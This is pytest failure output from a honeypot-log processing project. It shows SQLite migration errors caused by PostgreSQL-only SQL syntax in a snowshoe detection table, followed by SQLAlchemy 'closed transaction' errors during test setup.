INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestSSHKeyExtractionIntegration.test_extract_and_store_ssh_keys _

    @pytest.fixture
    def test_db() -> None:
        """Create a test database with SSH key intelligence schema."""
        engine = create_engine("sqlite:///:memory:", echo=False)
    
        # Apply migrations to create all tables including SSH key intelligence
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_ssh_key_enrichment.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26f2270>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:41:43,693:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:43,693:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:43,693:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:43,693:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:43,700:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:43,700:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:43,703:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:43,703:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:43,705:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:43,705:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:43,706:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:43,706:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:43,707:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:43,707:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:43,711:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:43,711:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:43,712:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:43,712:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:43,713:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:43,713:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:43,714:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:43,714:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:43,715:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:43,715:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:43,716:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:43,716:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:43,718:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:43,718:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:43,719:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:43,719:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:43,720:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:43,720:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:43,720:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:43,720:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:43,721:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:43,721:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:43,721:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:43,721:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:43,722:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:43,722:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
__ ERROR at setup of TestSSHKeyExtractionIntegration.test_session_key_linking __

    @pytest.fixture
    def test_db() -> None:
        """Create a test database with SSH key intelligence schema."""
        engine = create_engine("sqlite:///:memory:", echo=False)
    
        # Apply migrations to create all tables including SSH key intelligence
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_ssh_key_enrichment.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26e27b0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:41:44,103:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:44,103:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:44,103:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:44,103:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:44,110:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:44,110:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:44,111:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:44,111:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:44,112:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:44,112:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:44,116:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:44,116:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:44,117:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:44,117:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:44,119:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:44,119:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:44,120:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:44,120:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:44,121:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:44,121:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:44,122:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:44,122:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:44,123:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:44,123:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:44,126:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:44,126:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:44,126:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:44,126:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:44,127:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,127:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,128:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,128:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,128:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,128:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,129:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,129:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,129:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,129:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,130:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:44,130:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
